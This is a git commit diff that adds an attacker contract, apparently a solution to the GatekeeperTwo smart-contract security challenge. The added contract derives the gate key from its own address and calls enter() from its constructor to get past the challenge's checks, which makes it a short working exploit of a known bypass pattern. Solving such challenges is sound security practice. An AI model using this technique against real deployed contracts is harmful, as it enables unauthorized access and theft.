ae9864aa142e17c403ec3f0ad986925cf1c2406b
Ammon Werner <ammon@altafin.co>
2022-05-25 15:26:05 -0600

    Create GatAttackerTwo contract

--- contracts/Gatekeeper Two.sol
+++ contracts/Gatekeeper Two.sol
@@ -27,3 +27,10 @@ contract GatekeeperTwo {
     return true;
   }
 }
+
+contract GateAttackerTwo {
+    constructor(address _gateAddr) public {
+        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff));
+        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
+    }
+}
